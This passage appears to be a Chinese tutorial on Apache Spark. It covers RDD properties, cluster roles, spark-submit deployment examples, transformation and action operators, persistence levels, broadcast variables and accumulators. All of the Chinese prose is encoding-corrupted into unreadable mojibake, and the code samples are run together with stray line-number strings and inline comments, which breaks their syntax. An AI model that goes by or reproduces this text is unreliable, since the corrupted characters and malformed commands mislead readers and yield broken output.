hash-partitioned)ï¼š Partitioner: è‡ªå®šä¹‰åˆ†åŒºä½¿ç”¨ 5ã€Optionally, a list of preferred locations to compute each split on (e.g. block locations for an HDFS file)ï¼šä¸€ä¸ªåˆ—è¡¨ï¼Œå­˜å‚¨å­˜å–æ¯ä¸ª Partition çš„ä¼˜å…ˆä½ç½®ï¼ˆpreferred locationï¼‰ã€‚ Spark ä¸­å…¶å®ƒé‡è¦æ¦‚å¿µCluster Managerï¼šSpark çš„é›†ç¾¤ç®¡ç†å™¨ï¼Œä¸»è¦è´Ÿè´£èµ„æºçš„åˆ†é…ä¸ç®¡ç†ã€‚é›†ç¾¤ç®¡ç†å™¨åˆ†é…çš„èµ„ æºå±äºä¸€çº§åˆ†é…ï¼Œå®ƒå°†å„ä¸ª Worker ä¸Šçš„å†…å­˜ã€CPU ç­‰èµ„æºåˆ†é…ç»™åº”ç”¨ç¨‹åºï¼Œä½†æ˜¯å¹¶ä¸è´Ÿè´£ å¯¹ Executor çš„èµ„æºåˆ†é…ã€‚ç›®å‰ï¼ŒStandaloneã€YARNã€Mesosã€K8Sï¼ŒEC2 ç­‰éƒ½å¯ä»¥ä½œä¸º Spark çš„é›†ç¾¤ç®¡ç†å™¨ã€‚ Masterï¼šSpark é›†ç¾¤çš„ä¸»èŠ‚ç‚¹ã€‚ Workerï¼šSpark é›†ç¾¤çš„å·¥ä½œèŠ‚ç‚¹ã€‚å¯¹ Spark åº”ç”¨ç¨‹åºæ¥è¯´ï¼Œç”±é›†ç¾¤ç®¡ç†å™¨åˆ†é…å¾—åˆ°èµ„æºçš„ Worker èŠ‚ç‚¹ä¸»è¦è´Ÿè´£ä»¥ä¸‹å·¥ä½œï¼šåˆ›å»º Executorï¼Œå°†èµ„æºå’Œä»»åŠ¡è¿›ä¸€æ­¥åˆ†é…ç»™ Executorï¼ŒåŒæ­¥ èµ„æºä¿¡æ¯ç»™ Cluster Managerã€‚ Executorï¼šæ‰§è¡Œè®¡ç®—ä»»åŠ¡çš„ä¸€äº›è¿›ç¨‹ã€‚ä¸»è¦è´Ÿè´£ä»»åŠ¡çš„æ‰§è¡Œä»¥åŠä¸ Workerã€Driver Application çš„ä¿¡æ¯åŒæ­¥ã€‚ Driver Appicationï¼šå®¢æˆ·ç«¯é©±åŠ¨ç¨‹åºï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºï¼Œç”¨äºå°†ä»»åŠ¡ç¨‹åºè½¬æ¢ ä¸º RDD å’Œ DAGï¼Œå¹¶ä¸ Cluster Manager è¿›è¡Œé€šä¿¡ä¸è°ƒåº¦ã€‚ å…³ç³»: 1ã€ç”¨æˆ·ä½¿ç”¨ SparkContext æä¾›çš„ APIï¼ˆå¸¸ç”¨çš„æœ‰ textFileã€sequenceFileã€runJobã€stop ç­‰ï¼‰ ç¼–å†™ Driver Application ç¨‹åºã€‚æ­¤å¤– SQLContextã€HiveContext åŠ StreamingContext å¯¹ SparkContext è¿›è¡Œå°è£…ï¼Œå¹¶æä¾›äº† SQLã€Hive åŠæµå¼è®¡ç®—ç›¸å…³çš„ APIã€‚ 2ã€ä½¿ç”¨ SparkContext æäº¤çš„ç”¨æˆ·åº”ç”¨ç¨‹åºï¼Œé¦–å…ˆä¼šä½¿ç”¨ BlockManager å’Œ BroadcastManager å°†ä»»åŠ¡çš„ Hadoop é…ç½®è¿›è¡Œå¹¿æ’­ã€‚ç„¶åç”± DAGScheduler å°†ä»»åŠ¡è½¬æ¢ä¸º RDD å¹¶ç»„ç»‡æˆ DAGï¼Œ DAG è¿˜å°†è¢«åˆ’åˆ†ä¸ºä¸åŒçš„ Stageã€‚æœ€åç”± TaskScheduler å€ŸåŠ© ActorSystem å°†ä»»åŠ¡æäº¤ç»™é›†ç¾¤ ç®¡ç†å™¨ï¼ˆCluster Managerï¼‰ã€‚ 3ã€é›†ç¾¤ç®¡ç†å™¨ï¼ˆClusterManagerï¼‰ç»™ä»»åŠ¡åˆ†é…èµ„æºï¼Œå³å°†å…·ä½“ä»»åŠ¡åˆ†é…åˆ° Worker ä¸Šï¼ŒWorker åˆ›å»º Executor æ¥å¤„ç†ä»»åŠ¡çš„è¿è¡Œã€‚Standaloneã€YARNã€Mesosã€EC2 ç­‰éƒ½å¯ä»¥ä½œä¸º Spark çš„é›† ç¾¤ç®¡ç†å™¨ã€‚ æ³¨æ„: å¦‚æœæ˜¯ â€“deploy-mode client æ¨¡å¼, client å°±æ˜¯ Driver, â€“deploy-mode cluster æ¨¡å¼, Driver æ˜¯ç”±é›†ç¾¤åˆ†é…çš„ä¸€å° workerèŠ‚ç‚¹ ä¸‰. Spark çš„æ¶æ„(standalone)æ¶‰åŠåˆ°çš„åè¯: Driver, Master, Worker, Executor , Task å››. Spark ä»»åŠ¡æäº¤å‚è€ƒå®˜ç½‘ http://spark.apache.org/docs/latest/submitting-applications.html Clientæ¨¡å¼ ä¸æŒ‡å®šdeploy-mode ,é»˜è®¤å°±æ˜¯clientæ¨¡å¼ï¼Œä¹Ÿå°±æ˜¯å“ªä¸€å°æœåŠ¡å™¨æäº¤sparkä»£ç ï¼Œé‚£ä¹ˆå“ªä¸€å°å°±æ˜¯driveræœåŠ¡å™¨ã€‚ Clusteræ¨¡å¼ éœ€è¦æŒ‡å®šdeploy-modeï¼ŒdriveræœåŠ¡å™¨å¹¶ä¸æ˜¯æäº¤ä»£ç çš„é‚£ä¸€å°æœåŠ¡å™¨ï¼Œè€Œæ˜¯åœ¨æäº¤ä»£ç çš„æ—¶å€™ï¼Œåœ¨workerä¸»æœºä¸Šï¼ŒéšæœºæŒ‘é€‰ä¸€å°ä½œä¸ºdriveræœåŠ¡å™¨ï¼Œé‚£ä¹ˆå¦‚æœæäº¤10ä¸ªåº”ç”¨ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½10å°driveræœåŠ¡å™¨ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364# Run application locally on 8 cores./bin/spark-submit \ --class org.apache.spark.examples.SparkPi \ --master local[8] \ /path/to/examples.jar \ 100# Run on a Spark standalone cluster in client deploy mode./bin/spark-submit \ --class org.apache.spark.examples.SparkPi \ --master spark://207.184.161.138:7077 \ --executor-memory 20G \ --total-executor-cores 100 \ /path/to/examples.jar \ 1000# Run on a Spark standalone cluster in cluster deploy mode with supervise./bin/spark-submit \ --class org.apache.spark.examples.SparkPi \ --master spark://207.184.161.138:7077 \ --deploy-mode cluster \ --supervise \ --executor-memory 20G \ --total-executor-cores 100 \ /path/to/examples.jar \ 1000# Run on a YARN clusterexport HADOOP_CONF_DIR=XXX./bin/spark-submit \ --class org.apache.spark.examples.SparkPi \ --master yarn \ --deploy-mode cluster \ # can be client for client mode --executor-memory 20G \ --num-executors 50 \ /path/to/examples.jar \ 1000# Run a Python application on a Spark standalone cluster./bin/spark-submit \ --master spark://207.184.161.138:7077 \ examples/src/main/python/pi.py \ 1000# Run on a Mesos cluster in cluster deploy mode with supervise./bin/spark-submit \ --class org.apache.spark.examples.SparkPi \ --master mesos://207.184.161.138:7077 \ --deploy-mode cluster \ --supervise \ --executor-memory 20G \ --total-executor-cores 100 \ http://path/to/examples.jar \ 1000# Run on a Kubernetes cluster in cluster deploy mode./bin/spark-submit \ --class org.apache.spark.examples.SparkPi \ --master k8s://xx.yy.zz.ww:443 \ --deploy-mode cluster \ --executor-memory 20G \ --num-executors 50 \ http://path/to/examples.jar \ 1000 äº”. Transformationå’ŒactionåŸç†Sparkæ”¯æŒä¸¤ç§RDDæ“ä½œï¼štransformationå’Œactionã€‚ transformationæ“ä½œä¼šé’ˆå¯¹å·²æœ‰çš„RDDåˆ›å»ºä¸€ä¸ªæ–°çš„RDDï¼› è€Œactionåˆ™ä¸»è¦æ˜¯å¯¹RDDè¿›è¡Œæœ€åçš„æ“ä½œï¼Œæ¯”å¦‚éå†ã€reduceã€ä¿å­˜åˆ°æ–‡ä»¶ç­‰ï¼Œå¹¶å¯ä»¥è¿”å›ç»“æœç»™Driverç¨‹åºã€‚ ä¾‹å¦‚ï¼Œmapå°±æ˜¯ä¸€ç§transformationæ“ä½œï¼Œå®ƒç”¨äºå°†å·²æœ‰RDDçš„æ¯ä¸ªå…ƒç´ ä¼ å…¥ä¸€ä¸ªè‡ªå®šä¹‰çš„å‡½æ•°ï¼Œå¹¶è·å–ä¸€ä¸ªæ–°çš„å…ƒç´ ï¼Œç„¶åå°†æ‰€æœ‰çš„æ–°å…ƒç´ ç»„æˆä¸€ä¸ªæ–°çš„RDDã€‚è€Œreduceå°±æ˜¯ä¸€ç§actionæ“ä½œï¼Œå®ƒç”¨äºå¯¹RDDä¸­çš„æ‰€æœ‰å…ƒç´ è¿›è¡Œèšåˆæ“ä½œï¼Œå¹¶è·å–ä¸€ä¸ªæœ€ç»ˆçš„ç»“æœï¼Œç„¶åè¿”å›ç»™Driverç¨‹åºã€‚ transformationçš„ç‰¹ç‚¹å°±æ˜¯lazyç‰¹æ€§ã€‚lazyç‰¹æ€§æŒ‡çš„æ˜¯ï¼Œå¦‚æœä¸€ä¸ªsparkåº”ç”¨ä¸­åªå®šä¹‰äº†transformationæ“ä½œï¼Œé‚£ä¹ˆå³ä½¿ä½ æ‰§è¡Œè¯¥åº”ç”¨ï¼Œè¿™äº›æ“ä½œä¹Ÿä¸ä¼šæ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œtransformationæ˜¯ä¸ä¼šè§¦å‘sparkç¨‹åºçš„æ‰§è¡Œçš„ï¼Œå®ƒä»¬åªæ˜¯è®°å½•äº†å¯¹RDDæ‰€åšçš„æ“ä½œï¼Œä½†æ˜¯ä¸ä¼šè‡ªå‘çš„æ‰§è¡Œã€‚åªæœ‰å½“transformationä¹‹åï¼Œæ¥ç€æ‰§è¡Œäº†ä¸€ä¸ªactionæ“ä½œï¼Œé‚£ä¹ˆæ‰€æœ‰çš„transformationæ‰ä¼šæ‰§è¡Œã€‚Sparké€šè¿‡è¿™ç§lazyç‰¹æ€§ï¼Œæ¥è¿›è¡Œåº•å±‚çš„sparkåº”ç”¨æ‰§è¡Œçš„ä¼˜åŒ–ï¼Œé¿å…äº§ç”Ÿè¿‡å¤šä¸­é—´ç»“æœã€‚ actionæ“ä½œæ‰§è¡Œï¼Œä¼šè§¦å‘ä¸€ä¸ªspark jobçš„è¿è¡Œï¼Œä»è€Œè§¦å‘è¿™ä¸ªactionä¹‹å‰æ‰€æœ‰çš„transformationçš„æ‰§è¡Œã€‚è¿™æ˜¯actionçš„ç‰¹æ€§ã€‚ å…­. Transformation å’Œ Action ç®—å­1.Transformation ç®—å­Java ç‰ˆä»£ç , è§è¿™é‡Œ &amp; ä¸Šå±‚ç›®å½• Scala ç‰ˆä»£ç , è§è¿™é‡Œ &amp; ä¸Šå±‚ç›®å½• æˆ– ../ map:å¯¹è°ƒç”¨mapçš„RDDæ•°æ®é›†ä¸­çš„æ¯ä¸ªelementéƒ½ä½¿ç”¨funcï¼Œç„¶åè¿”å›ä¸€ä¸ªæ–°çš„RDD,è¿™ä¸ªè¿”å›çš„æ•°æ®é›†æ˜¯åˆ†å¸ƒå¼çš„æ•°æ®é›† filter:å¯¹è°ƒç”¨filterçš„RDDæ•°æ®é›†ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½ä½¿ç”¨funcï¼Œç„¶åè¿”å›ä¸€ä¸ªåŒ…å«ä½¿funcä¸ºtrueçš„å…ƒç´ æ„æˆçš„RDD flatMap:å’Œmapå·®ä¸å¤šï¼Œä½†æ˜¯flatMapç”Ÿæˆçš„æ˜¯å¤šä¸ªç»“æœ groupByKey, reduceByKey, sortByKey :å‡¡æ˜¯è¿™ç§.. ByKey çš„, å¿…é¡»ä¼ å…¥ä¸€ä¸ªå¯¹å¶å…ƒç¥–, Javaä¸­æ˜¯ JavaPairRdd cogroup ä¸ join ä¸ union åŒºåˆ«:è¯¦æƒ…å¯å‚è€ƒ cogroup ç›¸å½“äºSQLä¸­çš„å…¨å¤–å…³è”full outer joinï¼Œè¿”å›å·¦å³RDDä¸­çš„è®°å½•ï¼Œå…³è”ä¸ä¸Šçš„ä¸ºç©ºã€‚ return: JavaPairRDD[K, (JIterable[V], JIterable[W]) RDDçš„valueæ˜¯ä¸€ä¸ªPairçš„å®ä¾‹,è¿™ä¸ªå®ä¾‹åŒ…å«ä¸¤ä¸ªIterableçš„å€¼, Vè¡¨ç¤ºçš„æ˜¯RDD1ä¸­ç›¸åŒKEYçš„å€¼, Wè¡¨ç¤ºçš„æ˜¯RDD2ä¸­ç›¸åŒkeyçš„å€¼. join ç›¸å½“äºSQLä¸­çš„å†…å…³è”joinï¼Œåªè¿”å›ä¸¤ä¸ªRDDæ ¹æ®Kå¯ä»¥å…³è”ä¸Šçš„ç»“æœï¼Œjoinåªèƒ½ç”¨äºä¸¤ä¸ªRDDä¹‹é—´çš„å…³è”ï¼Œå¦‚æœè¦å¤šä¸ªRDDå…³è”ï¼Œå¤šå…³è”å‡ æ¬¡å³å¯ã€‚ union æ±‚rddå¹¶é›†ï¼Œä½†æ˜¯ä¸å»é‡ Intersectionï¼ŒDistinctï¼ŒCartesian intersection intersection æ±‚äº¤é›†,æå–ä¸¤ä¸ªrddä¸­éƒ½å«æœ‰çš„å…ƒç´ ã€‚ Returns a new RDD that contains the intersection of elements in the source dataset and the argument. Distinct (ç‹¬ç‰¹çš„,æœ‰åŒºåˆ«çš„) å»é‡ Return a new RDD containing the distinct elements in this RDD. Cartesian (ç¬›å¡å°”ç§¯) ç¬›å¡å°”ç§¯, å…¨è¿æ¥, å‰åé›†åˆä¸ªæ•°ä¸ºa,b, a x b ç§ç»„åˆ mapPartitionï¼Œreparationï¼Œcoalesce mapPartition è¯¥å‡½æ•°å’Œmapå‡½æ•°ç±»ä¼¼ï¼Œåªä¸è¿‡æ˜ å°„å‡½æ•°çš„å‚æ•°ç”±RDDä¸­çš„æ¯ä¸€ä¸ªå…ƒç´ å˜æˆäº†RDDä¸­æ¯ä¸€ä¸ªåˆ†åŒºçš„è¿­ä»£å™¨ã€‚å¦‚æœåœ¨æ˜ å°„çš„è¿‡ç¨‹ä¸­éœ€è¦é¢‘ç¹åˆ›å»ºé¢å¤–çš„å¯¹è±¡ï¼Œä½¿ç”¨mapPartitionsè¦æ¯”mapé«˜æ•ˆçš„å¤šã€‚ æ¯”å¦‚ï¼Œå°†RDDä¸­çš„æ‰€æœ‰æ•°æ®é€šè¿‡JDBCè¿æ¥å†™å…¥æ•°æ®åº“ï¼Œå¦‚æœä½¿ç”¨mapå‡½æ•°ï¼Œå¯èƒ½è¦ä¸ºæ¯ä¸€ä¸ªå…ƒç´ éƒ½åˆ›å»ºä¸€ä¸ªconnectionï¼Œè¿™æ ·å¼€é”€å¾ˆå¤§ï¼Œå¦‚æœä½¿ç”¨mapPartitionsï¼Œé‚£ä¹ˆåªéœ€è¦é’ˆå¯¹æ¯ä¸€ä¸ªåˆ†åŒºå»ºç«‹ä¸€ä¸ªconnectionã€‚ coalesce é»˜è®¤å‚æ•°ä¸º false, é»˜è®¤åªå“åº”å‡å°‘åˆ†åŒº, ä¸å“åº”å¢åŠ  :TODO å¦‚æœåŸæ¥æœ‰Nä¸ªpartitionï¼Œéœ€è¦é‡æ–°è§„åˆ’æ‰¿Mä¸ªpartition N,M å·®åˆ«å¤§çš„æ—¶å€™, coalesce(numPartitions: Int, shuffle: Boolean = false,..) çš„ shuffle å‚æ•°è¦è®¾ç½®ä¸º true reparation ä¸€èˆ¬æ”¹å˜åˆ†åŒºç”¨è¿™ä¸ªå°±è¡Œ reparitionæ˜¯coalesce shuffleä¸ºtrueçš„ç®€æ˜“å®ç° sample å’Œ aggregateByKey sample å¯¹RDDä¸­çš„é›†åˆå†…å…ƒç´ è¿›è¡Œé‡‡æ ·ï¼Œç¬¬ä¸€ä¸ªå‚æ•°withReplacementæ˜¯trueè¡¨ç¤ºæœ‰æ”¾å›å–æ ·ï¼Œfalseè¡¨ç¤ºæ— æ”¾å›ã€‚ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºæ¯”ä¾‹ 123456789/** *- @param withReplacement can elements be sampled multiple times (replaced when sampled out) @param fraction expected size of the sample as a fraction of this RDD's size seed æœ€å¥½ä¸è¦åŠ¨ */def sample( withReplacement: Boolean, fraction: Double, seed: Long = Utils.random.nextLong): RDD[T] aggregateByKey aggregateByKey(zeroValue)(seqOp, combOp, [numTasks]) //æŒ‰ç…§keyè¿›è¡Œèšåˆ å…¶å®reduceBykey å°±æ˜¯aggregateByKeyçš„ç®€åŒ–ç‰ˆã€‚ aggregateByKeyå¤šæä¾›äº†ä¸€ä¸ªå‡½æ•° seqOp ç±»ä¼¼äºMapreduceçš„combineæ“ä½œï¼ˆå°±åœ¨mapç«¯æ‰§è¡Œreduceçš„æ“ä½œï¼‰ mapPartitionsWithIndex å’Œ repartitionAndSortWithinPartitions mapPartitionsWithIndex è¯´ç™½äº†å°±æ˜¯å¯ä»¥æ‰“å°å‡ºå½“å‰æ‰€åœ¨åˆ†åŒºæ•° repartitionAndSortWithinPartitions è¯¥æ–¹æ³•ä¾æ®partitionerå¯¹RDDè¿›è¡Œåˆ†åŒºï¼Œå¹¶ä¸”åœ¨æ¯ä¸ªç»“æœåˆ†åŒºä¸­æŒ‰keyè¿›è¡Œæ’åºï¼›é€šè¿‡å¯¹æ¯”sortByKeyå‘ç°ï¼Œè¿™ç§æ–¹å¼æ¯”å…ˆåˆ†åŒºï¼Œç„¶ååœ¨æ¯ä¸ªåˆ†åŒºä¸­è¿›è¡Œæ’åºæ•ˆç‡é«˜ï¼Œè¿™æ˜¯å› ä¸ºå®ƒå¯ä»¥å°†æ’åºèå…¥åˆ°shuffleé˜¶æ®µã€‚ 2. Action ç®—å­Java ä»£ç è§è¿™é‡Œ reduce(); def reduce(f: JFunction2[T, T, T]): T = rdd.reduce(f) collect(); Return an array that contains all of the elements in this RDD. this method should only be used if the resulting array is expected to be small, as all the data is loaded into the driverâ€™s memory. take(n); Take the first num elements of the RDD. This currently scans the partitions one by one, so it will be slow if a lot of partitions are required. In that case, use collect() to get the whole RDD instead. this method should only be used if the resulting array is expected to be small, as all the data is loaded into the driverâ€™s memory. count(); Return the number of elements in the RDD. takeOrdered(); Returns the first k (smallest) elements from this RDD using the natural ordering for T while maintain the order. top(n): è‡ªç„¶æ’åºå,æœ€å¤§çš„å‰ n saveAsTextFile(); Save this RDD as a text file, using string representations of elements. countByKey(); return map&lt;String, Integer&gt;, key ä¸º key, value ä¸º key çš„æ•°é‡ takeSample(); withReplacementï¼šå…ƒç´ å¯ä»¥å¤šæ¬¡(é‡å¤)æŠ½æ ·(åœ¨æŠ½æ ·æ—¶æ›¿æ¢) å¦‚æœä¸º false, åœ¨æŠ½æ ·æ•° &gt; æ ·æœ¬æ•°æ—¶, åªèƒ½è¿”å›æ ·æœ¬æ•°çš„æ ·æœ¬ numï¼šè¿”å›çš„æ ·æœ¬çš„å¤§å° seedï¼šéšæœºæ•°ç”Ÿæˆå™¨çš„ç§å­ 1234def takeSample( withReplacement: Boolean, num: Int, seed: Long = Utils.random.nextLong): Array[T] ä¸ƒ. RDD çš„æŒä¹…åŒ–å°†æ•°æ®é€šè¿‡æ“ä½œæŒä¹…åŒ–ï¼ˆæˆ–ç¼“å­˜ï¼‰åœ¨å†…å­˜ä¸­æ˜¯Sparkçš„é‡è¦èƒ½åŠ›ä¹‹ä¸€ã€‚å½“ä½ ç¼“å­˜äº†ä¸€ä¸ªRDDï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½ç¼“å­˜äº†RDDçš„æ‰€æœ‰åˆ†åŒºã€‚è¿™æ ·å°±å¯ä»¥åœ¨å†…å­˜ä¸­è¿›è¡Œè®¡ç®—ã€‚è¿™æ ·å¯ä»¥ä½¿ä»¥ååœ¨RDDä¸Šçš„åŠ¨ä½œæ›´å¿«ï¼ˆé€šå¸¸å¯ä»¥æé«˜10å€ï¼‰ã€‚ ä½ å¯ä»¥å¯¹å¸Œæœ›ç¼“å­˜çš„RDDé€šè¿‡ä½¿ç”¨persistæˆ–cacheæ–¹æ³•è¿›è¡Œæ ‡è®°ã€‚å®ƒé€šè¿‡åŠ¨ä½œæ“ä½œç¬¬ä¸€æ¬¡åœ¨RDDä¸Šè¿›è¡Œè®¡ç®—åï¼Œå®ƒå°±ä¼šè¢«ç¼“å­˜åœ¨èŠ‚ç‚¹ä¸Šçš„å†…å­˜ä¸­ã€‚Sparkçš„ç¼“å­˜å…·æœ‰å®¹é”™æ€§ï¼Œå¦‚æœRDDçš„æŸä¸€åˆ†åŒºä¸¢å¤±ï¼Œå®ƒä¼šè‡ªåŠ¨ä½¿ç”¨æœ€åˆåˆ›å»ºRDDæ—¶çš„è½¬æ¢æ“ä½œè¿›è¡Œé‡æ–°è®¡ç®—ã€‚ å¦å¤–ï¼ŒRDDå¯ä»¥è¢«æŒä¹…åŒ–æˆä¸åŒçš„çº§åˆ«ã€‚æ¯”å¦‚ï¼Œå¯ä»¥å…è®¸ä½ å­˜å‚¨åœ¨ç£ç›˜ï¼Œå†…å­˜ï¼Œç”šè‡³æ˜¯åºåˆ—åŒ–çš„Javaå¯¹è±¡ï¼ˆèŠ‚çœç©ºé—´ï¼‰ï¼Œå¤‡ä»½åœ¨ä¸åŒçš„èŠ‚ç‚¹ä¸Šï¼Œæˆ–è€…å­˜å‚¨åœ¨åŸºäºå†…å­˜çš„æ–‡ä»¶ç³»ç»ŸTachyonä¸Šã€‚é€šè¿‡å‘persist()æ–¹æ³•ä¼ é€’StorageLevelå¯¹è±¡æ¥è®¾ç½®ã€‚cacheæ–¹æ³•æ˜¯ä½¿ç”¨é»˜è®¤çº§åˆ«StorageLevel.MEMORY_ONLYçš„æ–¹æ³•ã€‚ é€‰æŒä¹…åŒ–æ–¹æ¡ˆå»ºè®®ï¼š ä¼˜å…ˆé€‰æ‹©MEMORY_ONLYï¼Œå¦‚æœå¯ä»¥ç”¨å†…å­˜ç¼“å­˜æ‰€æœ‰çš„æ•°æ®ï¼Œé‚£ä¹ˆä¹Ÿå°±æ„å‘³ç€æˆ‘çš„è®¡ç®—æ˜¯çº¯å†…å­˜çš„è®¡ç®—ï¼Œé€Ÿåº¦å½“ç„¶å¿«ã€‚ å¦‚æœMEMORY_ONLY ç¼“å­˜ä¸äº†æ‰€æœ‰çš„æ•°æ®ï¼ŒMEMORY_ONLY_SER æŠŠæ•°æ®å®ç°åºåˆ—åŒ–ç„¶åè¿›è¡Œå­˜å‚¨ã€‚è¿™æ ·ä¹Ÿæ˜¯çº¯å†…å­˜æ“ä½œï¼Œé€Ÿåº¦ä¹Ÿå¿«ï¼Œåªä¸è¿‡éœ€è¦è€—è´¹ä¸€ç‚¹cpuèµ„æºéœ€è¦ååºåˆ—åŒ–ã€‚ ä¹Ÿå¯ä»¥é€‰ç”¨å¸¦_2è¿™ç§æ–¹å¼, æ­¤æ–¹å¼ä¼šå­˜2ä»½, ä¸€ä»½å­˜åœ¨æœ¬åœ°, å¦ä¸€ä»½ä¼šå­˜åˆ°å¦å¤–çš„èŠ‚ç‚¹ã€‚æ¢å¤é€Ÿåº¦çš„æ—¶å€™å¯ä»¥ä½¿ç”¨å¤‡ä»½ã€‚ èƒ½ä¸èƒ½ä½¿ç”¨DISKçš„ï¼Œå°±ä¸ä½¿ç”¨DISKï¼Œæœ‰æ—¶å€™ä»ç£ç›˜è¯»ï¼Œè¿˜ä¸å¦‚ä»æ–°è®¡ç®—ä¸€æ¬¡ã€‚ å…³äºtachyon Spark2.0å¼€å§‹å°±ä¸æŠŠtachyon(ç°åœ¨æˆä¸ºalluxio)é›†æˆåœ¨è‡ªèº«å†…éƒ¨äº†, ä¾ç„¶å¯ä»¥ç›´æ¥ç”¨ åŸºäºå†…å­˜çš„åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ å‡ºç°åŸå› : sparkè¿è¡Œä»¥ JVMä¸ºåŸºç¡€ï¼Œæ‰€ä»¥sparkçš„ä»»åŠ¡ä¼šæŠŠæ•°æ®å­˜å…¥JVMçš„å †ä¸­ï¼Œéšç€è®¡ç®—çš„è¿­ä»£ï¼ŒJVMå †ä¸­å­˜æ”¾çš„æ•°æ®é‡è¿…é€Ÿå¢å¤§ï¼Œå¯¹äºsparkè€Œè¨€ï¼Œsparkçš„è®¡ç®—å¼•æ“å’Œå­˜å‚¨å¼•æ“å¤„åœ¨åŒä¸€ä¸ªJVMä¸­ï¼Œæ‰€ä»¥ä¼šæœ‰é‡å¤çš„GCæ–¹é¢çš„å¼€é”€ã€‚è¿™æ ·å°±å¢å¤§äº†ç³»ç»Ÿçš„å»¶æ—¶ã€‚ å½“JVMå´©æºƒæ—¶ï¼Œç¼“å­˜åœ¨JVMå †ä¸­çš„æ•°æ®ä¹Ÿä¼šæ¶ˆå¤±ï¼Œè¿™ä¸ªæ—¶å€™sparkä¸å¾—ä¸æ ¹æ®RDDçš„è¡€ç¼˜å…³ç³»é‡æ–°è®¡ç®—æ•°æ®ã€‚ å¦‚æœsparkéœ€è¦å…¶ä»–çš„æ¡†æ¶çš„å…±äº«æ•°æ®ï¼Œæ¯”å¦‚å°±æ˜¯hadoopçš„Mapreduceï¼Œè¿™ä¸ªæ—¶å€™å°±å¿…é¡»é€šè¿‡ç¬¬ä¸‰æ–¹æ¥å…±äº«ï¼Œæ¯”å¦‚å€ŸåŠ©HDFSï¼Œé‚£ä¹ˆè¿™æ ·çš„è¯ï¼Œå°±éœ€è¦é¢å¤–çš„å¼€é”€ï¼Œå€ŸåŠ©çš„æ˜¯HDFSï¼Œé‚£ä¹ˆå°±éœ€è¦ç£ç›˜IOçš„å¼€é”€ã€‚ å› ä¸ºæˆ‘ä»¬åŸºäºå†…å­˜çš„åˆ†å¸ƒå¼è®¡ç®—æ¡†æ¶æœ‰ä»¥ä¸Šçš„é—®é¢˜ï¼Œé‚£ä¹ˆå°±ä¿ƒä½¿äº†å†…å­˜åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿçš„è¯ç”Ÿï¼Œæ¯”å¦‚tachyonã€‚ Tachyonå¯ä»¥è§£å†³sparkçš„ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ å¦‚æœæˆ‘ä»¬æŠŠæ•°æ®å­˜æ”¾åˆ°tachyonä¸Šé¢ï¼š å‡å°‘Spark GCçš„å¼€é”€ã€‚ å½“spark çš„JVMå´©æºƒçš„æ—¶å€™ï¼Œå­˜æ”¾åœ¨tachyonä¸Šçš„æ•°æ®ä¸å—å½±å“ã€‚ sparkå¦‚æœè¦æƒ³è·Ÿè¢«çš„è®¡ç®—å·¥å…·å…±äº«æ•°æ®ï¼Œåªè¦é€šè¿‡tachyonçš„Clientå°±å¯ä»¥åšåˆ°äº†ã€‚å¹¶ä¸”å»¶è¿Ÿè¿œä½äºHDFSç­‰ç³»ç»Ÿã€‚ å…«. å¹¿æ’­å˜é‡ å’Œ ç´¯åŠ å™¨1. å¹¿æ’­å˜é‡æ¯ä¸ª executor æ‹¥æœ‰ä¸€ä»½ï¼Œ è¿™ä¸ª executor å¯åŠ¨çš„ task ä¼šå…±äº«è¿™ä¸ªå˜é‡ ä½¿ç”¨äº†å¹¿æ’­å˜é‡ä¹‹å, executor ä¸­æ‰€æœ‰çš„ task éƒ½ä¼šå…±äº«æ­¤å˜é‡, å¦åˆ™æ¯ä¸ª task éƒ½ä¼šå‘ä¸€ä»½ åœ¨ Driver ç«¯å¯ä»¥ä¿®æ”¹å¹¿æ’­å˜é‡çš„å€¼ï¼Œåœ¨ Executor ç«¯æ— æ³•ä¿®æ”¹å¹¿æ’­å˜é‡çš„å€¼ã€‚ ä½¿ç”¨: 12345// å®šä¹‰val a = 3val broadcast = sc.broadcast(a)// è·å–val c = broadcast.value 2. ç´¯åŠ å™¨ä½¿ç”¨åœºæ™¯: å¼‚å¸¸ç›‘æ§ï¼Œè°ƒè¯•ï¼Œè®°å½•ç¬¦åˆæŸç‰¹æ€§çš„æ•°æ®çš„æ•°ç›®ç­‰ å¦‚æœä¸€ä¸ªå˜é‡ä¸è¢«å£°æ˜ä¸ºä¸€ä¸ªç´¯åŠ å™¨ï¼Œé‚£ä¹ˆå®ƒå°†åœ¨ è¢«æ”¹å˜æ—¶ä¸ä¼šåœ¨ driver ç«¯è¿›è¡Œå…¨å±€æ±‡æ€»ï¼Œå³åœ¨åˆ†å¸ƒå¼è¿è¡Œæ—¶æ¯ä¸ª task è¿è¡Œçš„åªæ˜¯åŸå§‹å˜é‡çš„ä¸€ä¸ªå‰¯æœ¬ï¼Œå¹¶ä¸èƒ½æ”¹å˜åŸå§‹å˜é‡çš„å€¼ ä½†æ˜¯å½“è¿™ä¸ªå˜é‡è¢«å£°æ˜ä¸ºç´¯åŠ å™¨åï¼Œè¯¥å˜é‡å°±ä¼šæœ‰åˆ†å¸ƒå¼è®¡æ•°çš„åŠŸèƒ½ã€‚ ç´¯åŠ å™¨åœ¨ Driver ç«¯å®šä¹‰èµ‹åˆå§‹å€¼ï¼Œç´¯åŠ å™¨åªèƒ½åœ¨ Driver ç«¯è¯»å–æœ€åçš„å€¼ï¼Œåœ¨ Excutor ç«¯æ›´ æ–°ã€‚ ä½¿ç”¨: 1234// å®šä¹‰val a = sc.longAccumulator(0)// è·å–val b = a.value ä¹. Spark on Yarn æ¨¡å¼é…ç½®: åªéœ€è¦åœ¨conf/spark-env.sh ä¸­é…ç½®export HADOOP_CONF_DIR=$HADOOP_HOME/etc/hadoop å°±å¯ä»¥äº† 